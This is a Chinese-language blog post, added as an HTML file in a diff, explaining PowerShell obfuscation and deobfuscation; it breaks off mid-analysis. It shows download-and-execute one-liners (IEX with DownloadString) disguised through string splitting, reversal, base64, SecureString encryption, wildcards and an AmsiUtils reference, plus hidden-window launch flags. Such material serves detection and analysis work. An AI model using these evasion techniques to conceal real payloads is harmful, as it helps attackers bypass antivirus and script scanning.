@@ -1,0 +1,487 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>ps-obfuscation | wd-z711&#39;s B10g</title>
+  <meta name="author" content="wd-z711">
+  
+  <meta name="description" content="Common student in China. Interested in web &amp; re.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="ps-obfuscation"/>
+  <meta property="og:site_name" content="wd-z711&#39;s B10g"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'G-YHJSKZDC3Y', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="wd-z711's B10g" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">wd-z711&#39;s B10g</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> ps-obfuscation</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="powershell混淆与反混"><a href="#powershell混淆与反混" class="headerlink" title="powershell混淆与反混"></a>powershell混淆与反混</h1><p>&emsp;powershell是基于<code>.net</code>开发的自动化语言。利用ps可以进行很多攻击，例如，利用<code>DownloadString</code>，能够在设备上运行命令/外壳代码/可执行文件，而<code>无需对设备磁盘进行任何写入操作</code>。或者使用<code>Marshall</code>类，外壳代码可以在内存中解密，并且可以在<code>不写入磁盘的情况下执行</code>。ps提供了对机器内核的访问，包括对Windows API的无限制访问。因此，越来越多的网络犯罪分子将PowerShell加入了他们的攻击武器库。</p>
+<span id="more"></span>
+<h2 id="powershell使用的参数"><a href="#powershell使用的参数" class="headerlink" title="powershell使用的参数"></a>powershell使用的参数</h2><h4 id="ExecutionPolicy"><a href="#ExecutionPolicy" class="headerlink" title="ExecutionPolicy"></a>ExecutionPolicy</h4><p>&emsp;为安全目的创建的策略，可确定可以在设备上运行的powershell脚本的类型：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Restricted：无法在设备上运行脚本</span><br><span class="line">AllSigned：只有由受信任的发布者签名的脚本才能运行</span><br><span class="line">RemoteSigned：只有本地生成的脚本文件才能运行</span><br><span class="line">Unrestricted：可以运行本地创建和签名的脚本，对于远程运行的脚本，将显示命令提示符</span><br><span class="line">Bypass：所有脚本都可以在设备上运行</span><br></pre></td></tr></table></figure>
+<p>&emsp;攻击者假设<code>ExecutionPolicy</code>值是<code>Restricted</code>或<code>RemoteSigned</code>的。此时，攻击者使用<code>powershell -EP bypass</code>或者<code>powershell -ExecutionPolicy bypass</code>来绕过。</p>
+<h4 id="EncodedCommand"><a href="#EncodedCommand" class="headerlink" title="EncodedCommand"></a>EncodedCommand</h4><p>&emsp;Powershell 可以解码并运行 Base64 值，使用<code>powershell -EncodedCommand &#39;Base64 &#39;</code>。</p>
+<h4 id="NonInteractive-NonI"><a href="#NonInteractive-NonI" class="headerlink" title="NonInteractive(NonI)"></a>NonInteractive(NonI)</h4><p>&emsp;执行非交互式脚本。</p>
+<h4 id="NoProfile（NoP）"><a href="#NoProfile（NoP）" class="headerlink" title="NoProfile（NoP）"></a>NoProfile（NoP）</h4><p>&emsp;允许用户在不加载powershell配置文件的情况下运行脚本。powershell配置文件包括：<code>Powershell变量、自定义设置、函数</code>。通过禁用此配置文件，攻击者可以禁用ExecutionPolicy值，因此可以绕过。</p>
+<h4 id="Sta"><a href="#Sta" class="headerlink" title="Sta"></a>Sta</h4><p>&emsp;单线程单元。一些 COM（组件对象模型）对象需要单线程单元模型。COM 对象用于访问系统服务。如果攻击者在其脚本中使用COM对象，可使用此参数来确保脚本能够工作。</p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>&emsp;因此，常见的ps命令行选项如下所示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -NoP -sta -NonI -W Hidden -Enc</span><br></pre></td></tr></table></figure>
+<h2 id="powershell混淆技法（绕过技法）"><a href="#powershell混淆技法（绕过技法）" class="headerlink" title="powershell混淆技法（绕过技法）"></a>powershell混淆技法（绕过技法）</h2><h3 id="去除关键字"><a href="#去除关键字" class="headerlink" title="去除关键字"></a>去除关键字</h3><p>&emsp;去除一些关键字，例如<code>system</code>等，例如：脚本中的<code>New-Object System.Net.WebClient</code> 可以改为<code>New-Object Net.WebClient</code>。</p>
+<h3 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h3><h4 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h4><p>&emsp;对于脚本中的字符串，例如<code>&quot;http://127.0.0.1/powershell&quot;</code>，可以改为<code>&quot;ht&quot;+&quot;tp://127.0.0.1/powershell&quot;</code>。</p>
+<h4 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$value1 = &quot;Onlyf8&quot;</span><br></pre></td></tr></table></figure>
+<p>&emsp;可以写为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$value1 = &quot;Oxxxaaanaaaabbbxlxxxaaaabbbbyfaaaaxxxxbb8&quot;</span><br><span class="line">$value1.Replace(&quot;x&quot;,&quot;&quot;).Replace(&quot;a&quot;,&quot;&quot;).Replace(&quot;b&quot;,&quot;&quot;)</span><br></pre></td></tr></table></figure>
+<p>&emsp;再比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$value1_=[Ref].Assembly.GetType((&#x27;System.Management.Automation.AmsiUtils&#x27;));</span><br></pre></td></tr></table></figure>
+<p>&emsp;可以写为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$value1_=[Ref].Assembly.GetType(((&#x27;&#123;4&#125;&#123;0&#125;&#123;9&#125;tem.&#123;3&#125;ana&#123;6&#125;ement.&#123;8&#125;&#123;2&#125;t&#123;7&#125;mati&#123;7&#125;n.&#123;8&#125;m&#123;9&#125;i&#123;5&#125;ti&#123;1&#125;&#123;9&#125;&#x27;)-f&#x27;y&#x27;,&#x27;l&#x27;,&#x27;u&#x27;,&#x27;M&#x27;,&#x27;S&#x27;,&#x27;U&#x27;,&#x27;g&#x27;,&#x27;o&#x27;,&#x27;A&#x27;,&#x27;s&#x27;));</span><br></pre></td></tr></table></figure>
+<h4 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h4><p>&emsp;<code>&quot;hello&quot;</code>可以写成<code>&quot;hELLO&quot;</code>。</p>
+<h4 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h4><p>&emsp;<code>&quot;hello&quot;</code>可以写成<code>&quot;he   llo&quot;</code>。</p>
+<h4 id="字符串转为命令"><a href="#字符串转为命令" class="headerlink" title="字符串转为命令"></a>字符串转为命令</h4><p>&emsp;<code>&quot;iex&quot;</code>转命令为<code>&amp;(&quot;iex&quot;)</code>。</p>
+<h3 id="使用Invoke方法"><a href="#使用Invoke方法" class="headerlink" title="使用Invoke方法"></a>使用Invoke方法</h3><p>&emsp;对于脚本中的方法调用，可以改为使用Invoke进行调用，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;xxx&quot;)</span><br></pre></td></tr></table></figure>
+<p>&emsp;可以改为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).(&quot;DownloadString&quot;).Invoke(&quot;xxx&quot;)</span><br></pre></td></tr></table></figure>
+<h3 id="使用NewScriptBlock命令"><a href="#使用NewScriptBlock命令" class="headerlink" title="使用NewScriptBlock命令"></a>使用NewScriptBlock命令</h3><p>&emsp;例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;xxx&quot;)</span><br></pre></td></tr></table></figure>
+<p>&emsp;可以改为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.($ExecutionContext.InvokeCommand.NewScriptBlock(&#x27;invoke-expression (New-Object System.Net.WebClient).DownloadString(&quot;xxx&quot;)&#x27;))</span><br></pre></td></tr></table></figure>
+<h3 id="使用invoke-command-xxx-（icm）命令"><a href="#使用invoke-command-xxx-（icm）命令" class="headerlink" title="使用invoke-command{xxx}（icm）命令"></a>使用invoke-command{xxx}（icm）命令</h3><p>&emsp;例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;xxx&quot;)</span><br></pre></td></tr></table></figure>
+<p>&emsp;可以改为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-command&#123;Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;xxx&quot;)&#125;</span><br></pre></td></tr></table></figure>
+<p>&emsp;将<code>invoke-command</code>缩写为<code>icm</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icm&#123;Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;xxx&quot;)&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="变量替代"><a href="#变量替代" class="headerlink" title="变量替代"></a>变量替代</h3><p>&emsp;例如脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;xxx&quot;)</span><br></pre></td></tr></table></figure>
+<p>&emsp;可以改为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression $test = New-Object System.Net.WebClient</span><br><span class="line">$test.DownloadString(&quot;xxx&quot;)</span><br></pre></td></tr></table></figure>
+<h3 id="关键字使用单双引号"><a href="#关键字使用单双引号" class="headerlink" title="关键字使用单双引号"></a>关键字使用单双引号</h3><p>&emsp;例如脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;xxx&quot;)</span><br></pre></td></tr></table></figure>
+<p>&emsp;可以改为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).&quot;DownloadString&quot;.Invoke(&quot;xxx&quot;)</span><br></pre></td></tr></table></figure>
+<p>&emsp;与<code>使用Invoke方法</code>类似，之后都可以接着使用<code>字符串链接</code>进行下一步混淆。</p>
+<p>&emsp;也可以改成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object (&quot;System.Net.WebClient&quot;)).&quot;DownloadString&quot;.Invoke(&quot;xxx&quot;)</span><br></pre></td></tr></table></figure>
+<h3 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h3><p>&emsp;例如脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;http://127.0.0.1/1&quot;)</span><br></pre></td></tr></table></figure>
+<p>&emsp;可以改为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;`htt`p`:`/`/`1`2`7`.`0`.`0`.`1`/`1&quot;)</span><br></pre></td></tr></table></figure>
+<p>&emsp;但是注意，有些字符转义后会影响本身的含义：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">`a----警报</span><br><span class="line">`b----退格</span><br><span class="line">`f----换页</span><br><span class="line">`n----换行</span><br><span class="line">`r----回车</span><br><span class="line">`t----水平制表</span><br><span class="line">`v----垂直制表</span><br></pre></td></tr></table></figure>
+<h3 id="使用通配符"><a href="#使用通配符" class="headerlink" title="使用通配符*"></a>使用通配符*</h3><p>&emsp;例如New-Object，使用通配符<code>*</code>可写成如下形式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&amp;(Get-Command New-Obje*)</span><br><span class="line">&amp;(Get-Command N*-O*)</span><br><span class="line">&amp;(GCM *w-O*)</span><br><span class="line">&amp;(COMMAND *w-*ct)</span><br></pre></td></tr></table></figure>
+<h3 id="动态变量混淆"><a href="#动态变量混淆" class="headerlink" title="动态变量混淆"></a>动态变量混淆</h3><p>&emsp;例如DownloadString，通过遍历函数并模糊匹配的方式找到此调用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).&quot;DownloadString&quot;.Invoke(&quot;xxx&quot;)</span><br></pre></td></tr></table></figure>
+<p>&emsp;可以改为（<code>`$_</code> 表示当前正在处理的对象）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).PsObject.Methods|Where-Object &#123;$_.Name -like &quot;*own*d*ing&quot;&#125;(&quot;http://127.0.0.1/1&quot;)</span><br></pre></td></tr></table></figure>
+<h3 id="变量传递"><a href="#变量传递" class="headerlink" title="变量传递"></a>变量传递</h3><p>&emsp;写入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe /c &quot;set cmd=Write-Host ENV-Fore Green&amp;&amp;powershell IEX $env:cmd&quot;</span><br></pre></td></tr></table></figure>
+<p>&emsp;其中<code>-c</code>代表执行命令后立即终止。之后执行两条指令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set cmd=Write-Host ENV-Fore Green</span><br></pre></td></tr></table></figure>
+<p>&emsp;代表定义cmd为一条ps指令，其为<code>Write-Host ENV-Fore Green</code>，当在ps中输入命令后，命令会赋给cmd。</p>
+<p>&emsp;接着执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX $env:cmd</span><br></pre></td></tr></table></figure>
+<p>&emsp;即运行刚才输入的命令。</p>
+<h3 id="字符串反转"><a href="#字符串反转" class="headerlink" title="字符串反转"></a>字符串反转</h3><p>&emsp;例如脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object Net.WebClient).DownloadString(&#x27;http://127.0.0.1/1&#x27;)</span><br></pre></td></tr></table></figure>
+<p>&emsp;可以改为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$re = &quot;)&#x27;1/1.0.0.721//:ptth&#x27;(gnirtSdaolnwoD.)tneilCbeW.teN tcejbO-weN(&quot;;</span><br><span class="line">Invoke-Expression ($re[-1..-($re.Length)] -Join &#x27;&#x27;)</span><br></pre></td></tr></table></figure>
+<h3 id="base64编码执行"><a href="#base64编码执行" class="headerlink" title="base64编码执行"></a>base64编码执行</h3><p>&emsp;例如脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object Net.WebClient).DownloadString(&#x27;http://127.0.0.1/1&#x27;)</span><br></pre></td></tr></table></figure>
+<p>&emsp;可以改为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$command = &quot;(New-Object Net.WebClient).DownloadString(&#x27;http://127.0.0.1/1&#x27;)&quot;</span><br><span class="line">$bytes = [System.Text.Encoding]::Unicode.GetBytes($command) </span><br><span class="line">$encodedCommand = [Convert]::ToBase64String($bytes) </span><br><span class="line">powershell.exe -EncodedCommand $encodedCommand</span><br></pre></td></tr></table></figure>
+<h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><p>&emsp;使用函数<code>SecureStringToBSTR</code>，若要运行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object Net.WebClient).DownloadString(&#x27;http://127.0.0.1/1&#x27;)</span><br></pre></td></tr></table></figure>
+<p>&emsp;可以写为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$cmd = &quot;Invoke-Expression (New-Object Net.WebClient).DownloadString(&#x27;http://127.0.0.1/1&#x27;)&quot;</span><br><span class="line">$secCmd = ConvertTo-SecureString $cmd -AsPlainText -Force</span><br><span class="line">$secCmdPlaintext = $secCmd | CovertFrom-SecureString -Key (1..16)</span><br><span class="line">$secCmd = $secCmdPlaintext | ConvertTo-SecureString -Key (1..16)</span><br><span class="line">([System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secCmd))) | IEX</span><br></pre></td></tr></table></figure>
+<h3 id="IEX等命令的替代"><a href="#IEX等命令的替代" class="headerlink" title="IEX等命令的替代"></a>IEX等命令的替代</h3><ul>
+<li>IEX别名：<code>Invoke-Expression</code>、<code>&amp;(GAL I*X)</code>。</li>
+<li>通过command的方式来进行编码：<code>Command I*e-E*</code>。</li>
+<li>使用环境变量：<code>$ExecutionContext.InvokeCommand.GetCmdlets(&#39;I*e-E*&#39;)</code>。</li>
+<li>其他选项/命令的别名（替代）如下所示：</li>
+</ul>
+<p><img src="/images/ps-obfuscation/image-20231016141807602.png" alt="image-20231016141807602" style="zoom:67%;" /></p>
+<h3 id="特殊字符混淆"><a href="#特殊字符混淆" class="headerlink" title="特殊字符混淆"></a>特殊字符混淆</h3><p>&emsp;可以使用特殊字符来定义变量，相关的项目名为<code>Invoke-Obfuscation</code>。给出如下脚本：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$!-&#125;  =+  $(  )  ;$&#123;;<span class="regexp">/=&#125;  =$&#123;$!-&#125;;$&#123;-&#125;=  ++  $&#123;$!-&#125;  ;$&#123;/</span>&#125;  =++$&#123;$!-&#125;;$&#123;(&#125;  =  ++  $&#123;$!-&#125;;$&#123;#&#125;=  ++$&#123;$!-&#125;;$&#123;.&#125;  =++  $&#123;$!-&#125;  ;$&#123;)@&#125;  =  ++  $&#123;$!-&#125;  ;$&#123;!&#125;  =++$&#123;$!-&#125;  ;$&#123;;~+&#125;=  ++  $&#123;$!-&#125;;$&#123;@&#125;=++$&#123;$!-&#125;  ;$&#123;[$ &#125;  =<span class="string">&quot;[&quot;</span>+  <span class="string">&quot;$(  @&#123;&#125;  )&quot;</span>[  $&#123;!&#125;]  +<span class="string">&quot;$(@&#123;&#125;)&quot;</span>[<span class="string">&quot;$&#123;-&#125;&quot;</span>+<span class="string">&quot;$&#123;@&#125;&quot;</span>]+<span class="string">&quot;$(@&#123;  &#125;)  &quot;</span>[<span class="string">&quot;$&#123;/&#125;&quot;</span>  +<span class="string">&quot;$&#123;;/=&#125;&quot;</span>  ]+<span class="string">&quot;$?&quot;</span>[$&#123;-&#125;  ]+<span class="string">&quot;]&quot;</span>;$&#123;$!-&#125;=<span class="string">&quot;&quot;</span>.(<span class="string">&quot;$(@&#123;&#125;  )  &quot;</span>[  <span class="string">&quot;$&#123;-&#125;$&#123;#&#125;&quot;</span>]  +  <span class="string">&quot;$(  @&#123;  &#125;  )  &quot;</span>[<span class="string">&quot;$&#123;-&#125;$&#123;)@&#125;&quot;</span>]+  <span class="string">&quot;$(  @&#123;&#125;)&quot;</span>[$&#123;;<span class="regexp">/=&#125;]+  &quot;$(  @&#123;&#125;  )&quot;[  $&#123;#&#125;]  +  &quot;$?&quot;[  $&#123;-&#125;  ]  +&quot;$(@&#123;  &#125;)  &quot;[$&#123;(&#125;]);$&#123;$!-&#125;=  &quot;$(@&#123;&#125;)&quot;[&quot;$&#123;-&#125;$&#123;#&#125;&quot;  ]+  &quot;$(  @&#123;&#125;)&quot;[  $&#123;#&#125;]  +  &quot;$&#123;$!-&#125;&quot;[  &quot;$&#123;/&#125;$&#123;!&#125;&quot;]  ;.$&#123;$!-&#125;(  &quot;$&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;@&#125;+  $&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;!&#125;  +$&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;;/=&#125;  +$&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;.&#125;  +$&#123;[$ &#125;$&#123;-&#125;$&#123;-&#125;$&#123;#&#125;+$&#123;[$ &#125;$&#123;(&#125;$&#123;/&#125;  +  $&#123;[$ &#125;$&#123;-&#125;$&#123;-&#125;$&#123;-&#125;+$&#123;[$ &#125;$&#123;-&#125;$&#123;-&#125;$&#123;;/=&#125;  +  $&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;;~+&#125;+$&#123;[$ &#125;$&#123;-&#125;$&#123;/&#125;$&#123;-&#125;+$&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;/&#125;+  $&#123;[$ &#125;$&#123;.&#125;$&#123;)@&#125;|  $&#123;$!-&#125;  &quot;  )</span></span><br></pre></td></tr></table></figure>
+<p>（1）按<code>;</code>隔开脚本，如下所示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$!-&#125;  =+  $(  )  ;</span><br><span class="line">$&#123;;/=&#125;  =$&#123;$!-&#125;;</span><br><span class="line">$&#123;-&#125;=  ++  $&#123;$!-&#125;  ;</span><br><span class="line">$&#123;/&#125;  =++$&#123;$!-&#125;;</span><br><span class="line">$&#123;(&#125;  =  ++  $&#123;$!-&#125;;</span><br><span class="line">$&#123;#&#125;=  ++$&#123;$!-&#125;;</span><br><span class="line">$&#123;.&#125;  =++  $&#123;$!-&#125;  ;</span><br><span class="line">$&#123;)@&#125;  =  ++  $&#123;$!-&#125;  ;</span><br><span class="line">$&#123;!&#125;  =++$&#123;$!-&#125;  ;</span><br><span class="line">$&#123;;~+&#125;=  ++  $&#123;$!-&#125;;</span><br><span class="line">$&#123;@&#125;=++$&#123;$!-&#125;  ;</span><br><span class="line">$&#123;[$ &#125;  =&quot;[&quot;+  &quot;$(  @&#123;&#125;  )&quot;[  $&#123;!&#125;]  +&quot;$(@&#123;&#125;)&quot;[&quot;$&#123;-&#125;&quot;+&quot;$&#123;@&#125;&quot;]+&quot;$(@&#123;  &#125;)  &quot;[&quot;$&#123;/&#125;&quot;  +&quot;$&#123;;/=&#125;&quot;  ]+&quot;$?&quot;[$&#123;-&#125;  ]+&quot;]&quot;;</span><br><span class="line">$&#123;$!-&#125;=&quot;&quot;.(&quot;$(@&#123;&#125;  )  &quot;[  &quot;$&#123;-&#125;$&#123;#&#125;&quot;]  +  &quot;$(  @&#123;  &#125;  )  &quot;[&quot;$&#123;-&#125;$&#123;)@&#125;&quot;]+  &quot;$(  @&#123;&#125;)&quot;[$&#123;;/=&#125;]+  &quot;$(  @&#123;&#125;  )&quot;[  $&#123;#&#125;]  +  &quot;$?&quot;[  $&#123;-&#125;  ]  +&quot;$(@&#123;  &#125;)  &quot;[$&#123;(&#125;]);</span><br><span class="line">$&#123;$!-&#125;=  &quot;$(@&#123;&#125;)&quot;[&quot;$&#123;-&#125;$&#123;#&#125;&quot;  ]+  &quot;$(  @&#123;&#125;)&quot;[  $&#123;#&#125;]  +  &quot;$&#123;$!-&#125;&quot;[  &quot;$&#123;/&#125;$&#123;!&#125;&quot;]  ;</span><br><span class="line">.$&#123;$!-&#125;(  &quot;$&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;@&#125;+  $&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;!&#125;  +$&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;;/=&#125;  +$&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;.&#125;  +$&#123;[$ &#125;$&#123;-&#125;$&#123;-&#125;$&#123;#&#125;+$&#123;[$ &#125;$&#123;(&#125;$&#123;/&#125;  +  $&#123;[$ &#125;$&#123;-&#125;$&#123;-&#125;$&#123;-&#125;+$&#123;[$ &#125;$&#123;-&#125;$&#123;-&#125;$&#123;;/=&#125;  +  $&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;;~+&#125;+$&#123;[$ &#125;$&#123;-&#125;$&#123;/&#125;$&#123;-&#125;+$&#123;[$ &#125;$&#123;-&#125;$&#123;;/=&#125;$&#123;/&#125;+  $&#123;[$ &#125;$&#123;.&#125;$&#123;)@&#125;|  $&#123;$!-&#125;  &quot;  )</span><br></pre></td></tr></table></figure>
+<p>（2）执行完前12行后，有：</p>
